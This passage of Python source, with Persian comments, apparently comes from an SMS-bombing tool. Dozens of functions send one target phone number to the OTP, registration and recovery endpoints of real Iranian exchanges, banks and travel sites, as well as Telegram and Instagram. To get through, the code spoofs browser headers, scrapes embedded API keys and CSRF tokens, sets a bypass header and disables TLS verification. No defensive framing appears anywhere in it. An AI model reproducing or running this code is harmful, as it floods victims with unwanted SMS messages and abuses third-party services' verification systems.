        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] HotelYar: شماره نامعتبر")
            return False

        url = "https://hotelyar.com/api/handle-api"
        payload = {
            "options": {
                "method": "POST",
                "body": {"mobile": clean_phone},
                "headers": {"Content-Type": "application/json"}
            },
            "endPoint": "/login-register"
        }

        headers = {
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200:
            print("[+] HotelYar: درخواست ارسال شد")
            return True
        else:
            print(f"[-] HotelYar: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] HotelYar Exception: {e}")
        return False
        
        
def cita(phone, auth="Basic Y2xpZW50QXBwSWQ6dGVzdA=="):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] Cita: شماره نامعتبر")
            return False

        url = f"https://api.cita.ir/auth/tsv/generate"
        payload = {"username": clean_phone}  # مطابق نمونه‌ی شما
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": auth,
            "Accept": "application/json"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", True):  # برخی APIها success ندارن
            print("[+] Cita: OTP ارسال شد")
            return True
        else:
            print(f"[-] Cita: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Cita Exception: {e}")
        return False
        
def safarbazi(phone, name="نام و نام خانوادگی", password="123456Mm@"):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] Safarbazi: شماره نامعتبر")
            return False

        url = "https://api.safarbazi.com/v1/codes/send-code"
        payload = {
            "dialing_prefix": "+98",
            "mobile": clean_phone[1:],  # بدون صفر اول
            "name": name,
            "password": password,
            "password_confirmation": password
        }

        headers = {
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", True):
            print("[+] Safarbazi: OTP ارسال شد")
            return True
        else:
            print(f"[-] Safarbazi: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Safarbazi Exception: {e}")
        return False
        

def bit24(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = clean_phone[2:]
        elif clean_phone.startswith('0'):
            clean_phone = clean_phone[1:]
        
        if not re.match(r"^9\d{9}$", clean_phone):
            return False

        url = "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code"
        
        payload = {
            "country_code": "98",
            "mobile": "0" + clean_phone
        }
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://bit24.cash"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False

def abantether(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.abantether.com/api/v2/auths/register/phone/send"
        
        payload = {
            "phone_number": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "fa",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://abantether.com",
            "Referer": "https://abantether.com/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
def ompfinex(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.ompfinex.com/v2/user/sign-up"
        
        payload = {
            "username": clean_phone
        }
        
        headers = {
            "x-platform": "web",
            "ngsw-bypass": "1",
            "x-version": "307",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://ompfinex.com",
            "Referer": "https://ompfinex.com/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
def ubitex(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج API Key
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        response = session.get("https://ubitex.io/", headers=headers, timeout=10)
        
        # استخراج API Key و Secret از صفحه
        api_key = "1b285fe3-935f-43f2-9a12-0eaace9f0607"  # مقدار پیشفرض
        api_secret = "8d91944f-ee3c-4d44-9826-6275148637ec"  # مقدار پیشفرض
        
        # جستجو در JavaScript برای API Key
        api_key_match = re.search(r'apiKey["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
        api_secret_match = re.search(r'apiSecret["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
        
        if api_key_match:
            api_key = api_key_match.group(1)
        if api_secret_match:
            api_secret = api_secret_match.group(1)

        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.ubitex.io/api/member/v2/register"
        
        payload = {
            "EmailOrMobile": clean_phone,
            "Password": "Test123!@#",
            "phone": clean_phone,
            "ConfirmPassword": "Test123!@#"
        }
        
        headers = {
            "apiSecret": api_secret,
            "apiKey": api_key,
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://ubitex.io",
            "Referer": "https://ubitex.io/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return True
        else:
            return response.status_code == 400

    except Exception:
        return False
        
          
def sarmayex(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = f"https://api.sarmayex.com/api/v2/otp?receiver={clean_phone}&otp_type=SMS&otp_section=REGISTER"
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Client-Type": "pwa",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://sarmayex.com",
            "Referer": "https://sarmayex.com/"
        }

        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
def coinkade(phone):
    try:
        # پاکسازی و فرمت شماره
        phone = phone.replace('+', '').replace(' ', '')
        if phone.startswith('98'):
            phone = '0' + phone[2:]
        elif not phone.startswith('0'):
            phone = '0' + phone

        if not re.match(r"^09\d{9}$", phone):
            print(f"{r}[!] Coinkade: شماره نامعتبر{a}")
            return False

        # دریافت CSRF token
        get_url = f"https://api.coinkade.biz/user/get-user/{phone}?recaptchaValue="
        resp = requests.get(get_url, timeout=10)
        csrf = resp.json().get("csrfToken")
        if not csrf:
            print(f"{r}[!] Coinkade: نتونستم CSRF پیدا کنم!{a}")
            return False
        print(f"{g}[+] Coinkade: CSRF گرفته شد{a}")

        # ارسال OTP
        post_url = "https://api.coinkade.biz/otp-code?recaptchaValue="
        payload = {"username": phone, "csrfToken": csrf}
        headers = {
            "Authorization": f"Bearer {csrf}",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
            "Origin": "https://coinkade.biz",
            "Referer": "https://coinkade.biz/"
        }

        response = requests.post(post_url, json=payload, headers=headers, timeout=10)
        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")

        if response.status_code == 200:
            print(f"{g}[+] Coinkade: کد ارسال شد!{a}")
            return True
        print(f"{r}[-] Coinkade: خطا در ارسال ({response.status_code}){a}")
        return False

    except Exception as e:
        print(f"{r}[!] Coinkade Exception: {e}{a}")
        return False
        
def twox(phone):
    try:
        # پاکسازی و فرمت شماره
        phone = phone.replace('+', '').replace(' ', '')
        if phone.startswith('98'):
            phone = '0' + phone[2:]
        elif not phone.startswith('0'):
            phone = '0' + phone

        if not re.match(r"^09\d{9}$", phone):
            print(f"{r}[!] Twox: شماره نامعتبر{a}")
            return False

        url = f"https://api.twox.ir/api/accounts/signin?username={phone}&otpKind=1"
        payload = {
            "token": "اینجا JWT توکن خود سایت یا session خود را قرار بده"
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "fa-IR",
            "x-agent-source": "web mobile",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)

        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")

        if response.status_code == 200:
            print(f"{g}[+] Twox: کد OTP ارسال شد!{a}")
            return True
        else:
            print(f"{r}[-] Twox: خطا در ارسال ({response.status_code}){a}")
            return False

    except Exception as e:
        print(f"{r}[!] Twox Exception: {e}{a}")
        return False
        
def arzunex(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print(f"{r}[!] ArzUnex: شماره نامعتبر{a}")
            return False

        url = "https://arzunex.ir/core/api/v2/public/customer/auth/otp/generate"
        payload = {"mobile": clean_phone}
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)

        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")

        if response.status_code in [200, 201]:  # تغییر این خط
            print(f"{g}[+] ArzUnex: OTP ارسال شد!{a}")
            return True
        else:
            print(f"{r}[-] ArzUnex: خطا در ارسال ({response.status_code}){a}")
            return False

    except Exception as e:
        print(f"{r}[!] ArzUnex Exception: {e}{a}")
        return False
        
    
def gruccia(phone, firstname="نام", lastname="نام‌خانوادگی", password="123456Mm@"):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print(f"{r}[!] Gruccia: شماره نامعتبر{a}")
            return False

        url = "https://gruccia.ir/login?back=my-account"
        payload = {
            "username": clean_phone,
            "id_customer": "",
            "back": "",
            "firstname": firstname,
            "lastname": lastname,
            "password": password,
            "action": "register",
            "ajax": "1"
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)

        print(f"{y}[DEBUG] Status: {response.status_code}{a}")
        print(f"{y}[DEBUG] Response: {response.text[:200]}{a}")

        if response.status_code == 200:
            print(f"{g}[+] Gruccia: درخواست ثبت نام ارسال شد!{a}")
            return True
        else:
            print(f"{r}[-] Gruccia: خطا در ارسال ({response.status_code}){a}")
            return False

    except Exception as e:
        print(f"{r}[!] Gruccia Exception: {e}{a}")
        return False
        
def booking(phone):
    try:
        session = requests.Session()
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        session.get("https://www.booking.ir/fa/auth/recovery", headers=headers, timeout=10)
        
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = clean_phone[2:]
        elif clean_phone.startswith('0'):
            clean_phone = clean_phone[1:]
        
        if not re.match(r"^9\d{9}$", clean_phone):
            return False

        url = "https://www.booking.ir/fa/v2/sendrecoveryaccountcodebymobile/"
        
        payload = {
            "mobile": clean_phone,
            "countryCode": "IR"
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://www.booking.ir",
            "Referer": "https://www.booking.ir/fa/auth/recovery"
        }

        response = session.post(url, data=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False



def mydigipay(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.mydigipay.com/digipay/api/users/send-sms"
        
        payload = {
            "cellNumber": clean_phone,
            "device": {
                "deviceId": str(uuid.uuid4()),
                "deviceModel": "iOS/Safari",
                "deviceAPI": "WEB_BROWSER",
                "osName": "WEB"
            }
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
        
        

def vakiljo(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://vakiljo.ir/api/graphql"
        
        payload = {
            "query": "mutation($mobile:String!){challengeUser(mobile:$mobile){status message}}",
            "variables": {"mobile": clean_phone}
        }
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
        
        
def nikpardakht(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.nikpardakht.com/api/v1/register"
        
        payload = {
            "mobile": clean_phone,
            "type": "natural", 
            "endPointType": "v1/register"
        }
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://nikpardakht.com",
            "Referer": "https://nikpardakht.com/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # بررسی دقیق‌تر پاسخ
        if response.status_code == 200:
            return True
        elif response.status_code == 429:
            print(f"{y}[-] NikPardakht: محدودیت ارسال{a}")
            return False
        else:
            print(f"{r}[-] NikPardakht: خطا - {response.status_code}{a}")
            return False

    except Exception as e:
        print(f"{r}[!] NikPardakht: خطا - {e}{a}")
        return False
        
        
def payaneh(phone):
    try:
        session = requests.Session()
        
        # اول صفحه اصلی رو بگیریم تا site-key رو استخراج کنیم
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        # دریافت صفحه اصلی
        response = session.get("https://payaneh.ir/", headers=headers, timeout=10)
        
        # استخراج site-key از صفحه
        site_key = "P/SX1ZuIKISPHngo"  # مقدار پیشفرض
        site_key_match = re.search(r'site-key["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
        if site_key_match:
            site_key = site_key_match.group(1)
        
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api-v2.payaneh.ir/api/otp-send"
        
        payload = {
            "phone": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "site-key": site_key,
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://payaneh.ir",
            "Referer": "https://payaneh.ir/"
        }

        response = session.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
   
        

def fadaktrains(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://apigateway.fadaktrains.com/api/auth/otp"
        
        payload = {
            "phoneNumber": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://fadaktrains.com",
            "Referer": "https://fadaktrains.com/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
        
def charter118(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://charter118.ir/_booking/home/token/initial_auth"
        
        # تولید token ساده (در واقعیت可能需要الگوریتم خاص)
        import hashlib
        token = hashlib.sha1(f"{clean_phone}{int(time.time())}".encode()).hexdigest()
        
        payload = {
            "mobile": clean_phone,
            "token": token
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://charter118.ir",
            "Referer": "https://charter118.ir/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
        
        
def accounts1606(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        # تولید timestamp فعلی
        timestamp = str(int(time.time() * 1000))
        url = f"https://accounts.1606.ir/otp/create?timestamp={timestamp}"
        
        payload = {
            "phoneOrEmail": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://accounts.1606.ir",
            "Referer": "https://accounts.1606.ir/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
        
def azkivam(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.azkivam.com/auth/login"
        
        payload = {
            "mobileNumber": clean_phone,
            "source": None
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://azkivam.com",
            "Referer": "https://azkivam.com/",
            "x-zrk-cs": "BYPASS"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False

def arzplus(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.arzplus.net/api/v1/accounts/signup/init/"
        
        payload = {
            "phone": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://arzplus.net",
            "Referer": "https://arzplus.net/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
        
      
def raastin(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.raastin.com/api/v1/accounts/signup/init/"
        
        payload = {
            "phone": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://raastin.com",
            "Referer": "https://raastin.com/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False
def tabdeal(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api-web.tabdeal.org/register/"
        
        payload = {
            "phone_or_email": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "fa-ir",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://tabdeal.org",
            "Referer": "https://tabdeal.org/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False      



def bitpin(phone):
    try:
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone
        
        if not re.match(r"^09\d{9}$", clean_phone):
            return False

        url = "https://api.bitpin.ir/v3/usr/authenticate/"
        
        payload = {
            "device_type": "web",
            "password": "123Mm@Mm",  # رمز عبور ثابت
            "phone": clean_phone
        }
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
            "Origin": "https://bitpin.ir",
            "Referer": "https://bitpin.ir/"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code == 200

    except Exception:
        return False

def telegram_send(phone):
    try:
        # ایجاد یک session جدید
        session = requests.Session()
        
        # درخواست اولیه برای ارسال کد
        api_url = "https://my.telegram.org/auth/send_password"
        
        # داده‌های مورد نیاز
        data = {
            'phone': phone
        }
        
        # هدرها
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://my.telegram.org',
            'Referer': 'https://my.telegram.org/auth',
        }
        
        # ارسال درخواست
        response = session.post(api_url, data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return True
        else:
            print(f"{r}[!] تلگرام: خطا - کد وضعیت {response.status_code}{a}")
            return False
            
    except Exception as e:
        print(f"{r}[!] تلگرام: خطا - {e}{a}")
        return False

# تابع برای دریافت کد اینستاگرام
def instagram_send(phone):
    try:
        # ایجاد session
        session = requests.Session()
        
        # دریافت CSRF token
        login_page = session.get('https://www.instagram.com/accounts/login/')
        csrf_token = login_page.cookies.get('csrftoken')
        
        # داده‌های درخواست
        data = {
            'phone_number': phone,
            'client_id': session.cookies.get('csrftoken'),
            'seamless_login_enabled': '1',
            'tos_version': 'row',
            'opt_into_one_tap': 'false'
        }
        
        # هدرها
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
        }
        
        # ارسال درخواست
        response = session.post('https://www.instagram.com/accounts/send_signup_sms_code/',
                              data=data, headers=headers, timeout=10)
        
        if response.status_code == 200:
            return True
        else:
            print(f"{r}[!] اینستاگرام: خطا - کد وضعیت {response.status_code}{a}")
            return False
            
    except Exception as e:
        print(f"{r}[!] اینستاگرام: خطا - {e}{a}")
        return False
        

def sibbank(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.5',
            'connection': 'keep-alive',
            'content-type': 'application/json',
            'host': 'api.sibbank.ir',
            'origin': 'https://sibbank.ir',
            'referer': 'https://sibbank.ir/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'TE': 'trailers',
            'user-agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        payload = {
            "phone_number": formatted_phone
        }
        
        response = requests.post(
            "https://api.sibbank.ir/v1/auth/login",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[sibbank] Status: {response.status_code}{a}')
        print(f'{y}[sibbank] Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(sibbank) OTP sent successfully! ✅{a}')
            return True
        else:
            print(f'{r}[-] sibbank error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] sibbank exception: {e}{a}')
        return False

def dastakht(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "mobile": formatted_phone,
            "countryCode": 98,
            "device_os": 2
        }
        
        response = requests.post(
            "https://dastkhat-isad.ir/api/v1/user/store",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[dastakht] Status: {response.status_code}{a}')
        print(f'{y}[dastakht] Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(dastakht) OTP sent successfully! ✅{a}')
            return True
        else:
            print(f'{r}[-] dastakht error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] dastakht exception: {e}{a}')
        return False
        

def pinket(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
